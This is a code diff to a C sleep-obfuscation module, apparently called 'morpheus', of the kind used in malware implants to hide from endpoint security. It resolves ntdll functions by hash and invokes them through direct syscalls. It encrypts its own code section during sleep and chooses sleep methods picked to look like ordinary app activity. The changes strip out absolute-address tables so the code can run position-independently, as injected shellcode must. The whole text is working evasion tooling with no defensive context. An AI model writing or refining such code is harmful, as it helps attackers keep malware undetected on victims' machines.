@@ -215,15 +215,15 @@ static DWORD extract_ssn(void *func_addr)
  * (defined in morpheus_syscalls.s)
  * ══════════════════════════════════════════════════════════════════════ */
 
-/* SSN globals (written during init, read by assembly stubs) */
-extern DWORD g_ssn_create_timer;
-extern DWORD g_ssn_set_timer;
-extern DWORD g_ssn_wait;
-extern DWORD g_ssn_close;
-extern DWORD g_ssn_create_event;
-extern DWORD g_ssn_protect;
-extern DWORD g_ssn_yield;
-extern DWORD g_ssn_query_perf;
+/* SSN globals — defined here (not in .s) so stores are RIP-relative, not .refptr. */
+DWORD g_ssn_create_timer __attribute__((visibility("hidden")));
+DWORD g_ssn_set_timer __attribute__((visibility("hidden")));
+DWORD g_ssn_wait __attribute__((visibility("hidden")));
+DWORD g_ssn_close __attribute__((visibility("hidden")));
+DWORD g_ssn_create_event __attribute__((visibility("hidden")));
+DWORD g_ssn_protect __attribute__((visibility("hidden")));
+DWORD g_ssn_yield __attribute__((visibility("hidden")));
+DWORD g_ssn_query_perf __attribute__((visibility("hidden")));
 
 /* Assembly syscall stubs — each does: mov r10,rcx; mov eax,[ssn]; syscall; ret */
 extern NTSTATUS morpheus_sc_create_timer(PHANDLE, ACCESS_MASK, PVOID, DWORD);
@@ -326,27 +326,25 @@ static int bootstrap(bootstrap_t *bs)
     bs->ntdll = locate_base(H_NTDLL_DLL);
     if (!bs->ntdll) return MORPHEUS_ERR_RESOLVE;
 
-    /* Step 2: Resolve Nt* function addresses via hash and extract SSNs */
-    struct { DWORD hash; DWORD *ssn_out; } syscalls[] = {
-        { H_NTCREATETIMER,             &g_ssn_create_timer },
-        { H_NTSETTIMER,                &g_ssn_set_timer    },
-        { H_NTWAITFORSINGLEOBJECT,     &g_ssn_wait         },
-        { H_NTCLOSE,                   &g_ssn_close        },
-        { H_NTCREATEEVENT,             &g_ssn_create_event },
-        { H_NTPROTECTVIRTUALMEMORY,    &g_ssn_protect      },
-        { H_NTYIELDEXECUTION,          &g_ssn_yield        },
-        { H_NTQUERYPERFORMANCECOUNTER, &g_ssn_query_perf   },
-    };
-
-    for (int i = 0; i < (int)(sizeof(syscalls) / sizeof(syscalls[0])); i++) {
-        FARPROC addr = resolve_addr(bs->ntdll, syscalls[i].hash);
-        if (!addr) return MORPHEUS_ERR_RESOLVE;
-
-        DWORD ssn = extract_ssn((void *)addr);
-        if (ssn == 0) return MORPHEUS_ERR_RESOLVE;
-
-        *syscalls[i].ssn_out = ssn;
-    }
+    /* Step 2: Resolve Nt* function addresses via hash and extract SSNs.
+     * Assign at runtime (LEA) — a static table of &g_ssn_* is an absolute VA blob. */
+#define BIND_SSN(hash, dst) do { \
+        FARPROC _addr = resolve_addr(bs->ntdll, (hash)); \
+        DWORD _ssn; \
+        if (!_addr) return MORPHEUS_ERR_RESOLVE; \
+        _ssn = extract_ssn((void *)_addr); \
+        if (_ssn == 0) return MORPHEUS_ERR_RESOLVE; \
+        (dst) = _ssn; \
+    } while (0)
+    BIND_SSN(H_NTCREATETIMER,             g_ssn_create_timer);
+    BIND_SSN(H_NTSETTIMER,                g_ssn_set_timer);
+    BIND_SSN(H_NTWAITFORSINGLEOBJECT,     g_ssn_wait);
+    BIND_SSN(H_NTCLOSE,                   g_ssn_close);
+    BIND_SSN(H_NTCREATEEVENT,             g_ssn_create_event);
+    BIND_SSN(H_NTPROTECTVIRTUALMEMORY,    g_ssn_protect);
+    BIND_SSN(H_NTYIELDEXECUTION,          g_ssn_yield);
+    BIND_SSN(H_NTQUERYPERFORMANCECOUNTER, g_ssn_query_perf);
+#undef BIND_SSN
 
     /* Step 3: Resolve Rtl* functions (not syscalls — function pointers) */
     bs->RtlAllocateHeap = (fn_RtlAllocateHeap)(void *)resolve_addr(bs->ntdll, H_RTLALLOCATEHEAP);
@@ -522,15 +520,7 @@ static int sleep_busywait(morpheus_ctx_t *ctx, DWORD ms)
     return MORPHEUS_OK;
 }
 
-/* ── Dispatch table ───────────────────────────────────────────────── */
-
-typedef int (*sleep_fn_t)(morpheus_ctx_t *ctx, DWORD ms);
-
-static const sleep_fn_t techniques[] = {
-    sleep_timer,       /* MORPHEUS_TECHNIQUE_TIMER    — common in normal apps  */
-    sleep_event,       /* MORPHEUS_TECHNIQUE_EVENT    — looks like I/O wait    */
-    sleep_busywait,    /* MORPHEUS_TECHNIQUE_BUSYWAIT — no sleep API at all    */
-};
+/* ── Sleep primitives (no function-pointer table — those bake absolute VAs). */
 
 /* ══════════════════════════════════════════════════════════════════════
  * Public API
@@ -631,7 +621,12 @@ int morpheus_sleep(morpheus_ctx_t *ctx, DWORD ms)
         page_guard_encrypt(ctx);
 
         /* Execute the sleep chunk via direct syscall */
-        techniques[tech](ctx, chunk);
+        if (tech == MORPHEUS_TECHNIQUE_TIMER)
+            sleep_timer(ctx, chunk);
+        else if (tech == MORPHEUS_TECHNIQUE_EVENT)
+            sleep_event(ctx, chunk);
+        else
+            sleep_busywait(ctx, chunk);
 
         /* Decrypt code section after waking */
         page_guard_decrypt(ctx);
